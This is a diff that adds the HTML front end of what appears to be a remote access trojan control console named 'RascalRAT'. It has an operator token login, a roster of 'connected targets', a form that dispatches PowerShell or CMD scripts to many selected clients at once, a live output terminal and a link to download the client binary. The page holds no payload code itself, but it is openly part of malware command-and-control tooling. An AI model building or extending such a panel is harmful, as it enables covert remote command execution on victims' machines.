@@ -1,0 +1,138 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#080b12">
+  <title>RascalRAT Console</title>
+  <link rel="stylesheet" href="/assets/styles.css">
+</head>
+<body>
+  <div class="auth-backdrop" id="authBackdrop" aria-hidden="true">
+    <section class="auth-card" role="dialog" aria-labelledby="authTitle">
+      <div class="brand-mark" aria-hidden="true">
+        <span></span><span></span><span></span>
+      </div>
+      <p class="eyebrow">SECURE CONSOLE</p>
+      <h1 id="authTitle">RascalRAT</h1>
+      <p class="auth-copy">Authenticate to open the remote administration workspace.</p>
+      <form id="authForm" class="auth-form">
+        <label for="tokenInput">Access token</label>
+        <div class="input-shell">
+          <input id="tokenInput" name="token" type="password" autocomplete="current-password" placeholder="Paste your token" required>
+          <button class="input-action" id="toggleToken" type="button" aria-label="Show token">Show</button>
+        </div>
+        <p class="form-message" id="authMessage" role="status"></p>
+        <button class="primary-button full" id="authSubmit" type="submit"><span>Authenticate</span><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M5 12h13M13 6l6 6-6 6"/></svg></button>
+      </form>
+      <p class="auth-foot">Authorized operators only</p>
+    </section>
+  </div>
+
+  <div class="app-shell" id="appShell" hidden>
+    <aside class="sidebar" id="sidebar">
+      <div class="sidebar-top">
+        <a class="brand" href="/" aria-label="RascalRAT home">
+          <span class="brand-symbol"><i></i><i></i><i></i></span>
+          <span><strong>RASCAL</strong><small>RAT CONSOLE</small></span>
+        </a>
+        <button class="icon-button mobile-close" id="mobileClose" type="button" aria-label="Close navigation">
+          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M6 6l12 12M18 6L6 18"/></svg>
+        </button>
+      </div>
+
+        <nav class="side-nav" aria-label="Primary navigation">
+          <div class="nav-label">Workspace</div>
+          <a class="nav-item active" href="#terminal"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="m5 7 5 5-5 5M12 17h7"/></svg><span>Terminal</span></a>
+          <a class="nav-item" href="#nodes"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="6" cy="6" r="2.5"/><circle cx="18" cy="6" r="2.5"/><circle cx="12" cy="18" r="2.5"/><path d="M8 7.5 10.5 16M16 7.5 13.5 16M8.5 6h7"/></svg><span>Connected clients</span></a>
+        </nav>
+
+      <div class="sidebar-bottom">
+        <div class="session-card">
+          <div class="session-icon"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 3 4.5 6v5c0 4.7 3.1 8.2 7.5 10 4.4-1.8 7.5-5.3 7.5-10V6L12 3Z"/><path d="m9 12 2 2 4-4"/></svg></div>
+          <div><strong>Session protected</strong><small>Token cookie active</small></div>
+        </div>
+        <button class="logout-button" id="logoutButton" type="button"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M10 4H5v16h5M14 8l4 4-4 4M18 12H8"/></svg><span>Sign out</span></button>
+      </div>
+    </aside>
+
+    <div class="sidebar-scrim" id="sidebarScrim"></div>
+
+    <main class="main-content">
+      <header class="topbar">
+        <button class="icon-button menu-button" id="menuButton" type="button" aria-label="Open navigation"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
+        <div class="topbar-title">
+          <p class="eyebrow">CONTROL PLANE</p>
+          <h1>Remote operations</h1>
+        </div>
+        <div class="topbar-actions">
+          <div class="connection-pill" id="connectionPill"><span class="pulse-dot"></span><span id="connectionText">Checking connection</span></div>
+          <button class="icon-button" id="refreshButton" type="button" aria-label="Refresh clients"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20 7v5h-5M4 17v-5h5"/><path d="M18.5 9A7 7 0 0 0 6.3 6.3L4 9M5.5 15a7 7 0 0 0 12.2 2.7L20 15"/></svg></button>
+        </div>
+      </header>
+
+      <div class="content-wrap">
+        <section class="overview-grid" aria-label="Workspace overview">
+          <article class="stat-card stat-primary">
+            <div class="stat-heading"><span>Connected targets</span><span class="stat-icon"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="6" cy="6" r="2.5"/><circle cx="18" cy="6" r="2.5"/><circle cx="12" cy="18" r="2.5"/><path d="M8 7.5 10.5 16M16 7.5 13.5 16M8.5 6h7"/></svg></span></div>
+            <strong id="connectedCount">0</strong><small id="connectionSubtext">clients online</small>
+          </article>
+          <article class="stat-card">
+            <div class="stat-heading"><span>Selected targets</span><span class="stat-icon"><svg viewBox="0 0 24 24" aria-hidden="true"><rect x="4" y="4" width="16" height="16" rx="2"/><path d="m9 12 2 2 4-4"/></svg></span></div>
+            <strong id="selectedCount">0</strong><small>ready to execute</small>
+          </article>
+          <article class="stat-card stat-accent">
+            <div class="stat-heading"><span>Console status</span><span class="stat-icon"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="m5 12 4 4L19 6"/></svg></span></div>
+            <strong id="consoleStatus">Operational</strong><small id="statusSubtext">management API available</small>
+          </article>
+        </section>
+
+        <section class="workspace-panel" id="terminal">
+          <div class="panel-heading">
+            <div><p class="eyebrow">COMMAND DECK</p><h2>Terminal output</h2></div>
+            <div class="heading-actions"><span class="live-indicator"><i></i>LIVE</span><button class="text-button" id="clearOutput" type="button">Clear</button></div>
+          </div>
+          <div class="terminal-window">
+            <div class="terminal-toolbar"><div class="window-dots"><span></span><span></span><span></span></div><strong id="outputTitle">agent-output</strong><span class="terminal-path">/workspace</span></div>
+            <div class="output-tabs" id="outputTabs"><span class="tab-empty">No targets selected</span></div>
+            <div class="terminal-body" id="terminalOutput" aria-live="polite"><div class="terminal-empty"><span class="terminal-empty-icon"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="m5 7 5 5-5 5M12 17h7"/></svg></span><p>Select a client and run a command to begin.</p></div></div>
+            <div class="terminal-footer"><span id="terminalStatus">No command running</span><span id="executionTime">Duration: --</span></div>
+          </div>
+        </section>
+
+        <section class="command-panel" id="nodes">
+          <div class="panel-heading compact"><div><p class="eyebrow">NEW INSTRUCTION</p><h2>Dispatch command</h2></div><span class="panel-tag">MULTI-TARGET</span></div>
+          <form id="taskForm" class="task-form">
+            <div class="target-picker">
+              <div><label for="targetSummary">Targets</label><button class="target-summary" id="targetSummary" type="button"><span id="selectedSummary">No targets selected</span><svg viewBox="0 0 24 24" aria-hidden="true"><path d="m7 10 5 5 5-5"/></svg></button></div>
+              <button class="secondary-button" id="openNodesMain" type="button"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="6" cy="6" r="2.5"/><circle cx="18" cy="6" r="2.5"/><circle cx="12" cy="18" r="2.5"/><path d="M8 7.5 10.5 16M16 7.5 13.5 16M8.5 6h7"/></svg>Select clients</button>
+            </div>
+            <div class="selected-chips" id="selectedChips"></div>
+            <div class="form-grid">
+              <div class="field"><label for="payloadType">Execution engine</label><select id="payloadType"><option value="powershell">PowerShell</option><option value="cmd">CMD</option></select><small>Choose the target interpreter.</small></div>
+              <div class="field"><label for="timeoutInput">Timeout (seconds)</label><input id="timeoutInput" type="number" min="1" max="600" value="10"><small>Maximum execution window.</small></div>
+            </div>
+            <div class="field"><label for="scriptBlock">Command script</label><textarea id="scriptBlock" required placeholder="Get-Process | Select-Object Name, CPU -First 5"></textarea><div class="textarea-footer"><span>Commands are sent to every selected client.</span><span>UTF-8</span></div></div>
+            <button class="primary-button execute-button" id="executeButton" type="submit"><span>Execute on selected clients</span><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M5 12h13M13 6l6 6-6 6"/></svg></button>
+          </form>
+        </section>
+
+        <section class="download-panel" id="download">
+          <a class="download-button" id="downloadLink" href="/download_client"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 3v12M7 10l5 5 5-5M5 21h14"/></svg><span>Download client binary</span></a>
+        </section>
+      </div>
+    </main>
+  </div>
+
+  <div class="modal-backdrop" id="nodeModal" hidden>
+    <section class="modal-card" role="dialog" aria-labelledby="nodeModalTitle">
+      <div class="modal-header"><div><p class="eyebrow">ROSTER</p><h2 id="nodeModalTitle">Connected clients</h2></div><button class="icon-button" id="closeNodes" type="button" aria-label="Close client selector"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M6 6l12 12M18 6 6 18"/></svg></button></div>
+      <div class="modal-toolbar"><label class="check-label"><input type="checkbox" id="selectAll"><span></span>Select all</label><span id="modalCount">0 selected</span></div>
+      <div class="node-list" id="nodeList"><div class="node-loading"><span class="small-spinner"></span>Loading clients...</div></div>
+    </section>
+  </div>
+
+  <div class="toast-region" id="toastRegion" aria-live="polite"></div>
+  <script src="/assets/app.js" type="module"></script>
+</body>
+</html>
